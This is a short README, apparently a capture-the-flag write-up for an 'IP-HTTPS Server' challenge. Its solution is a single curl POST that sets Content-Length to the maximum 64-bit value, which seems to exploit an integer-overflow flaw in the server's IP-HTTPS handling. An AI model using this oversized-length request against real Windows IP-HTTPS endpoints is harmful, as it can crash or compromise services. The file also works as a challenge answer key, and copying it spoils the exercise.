# IP-HTTPS Server

A simple webserver that returns the token when a [IP-HTTPS link is brought up](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-iphttps/140c6f34-dab5-47be-ba51-a48a6120b5ca).

## Solution

```bash
curl -k -X POST -H "Content-Length: 18446744073709551615" https://xmas.rip:16/IPHTTPS
```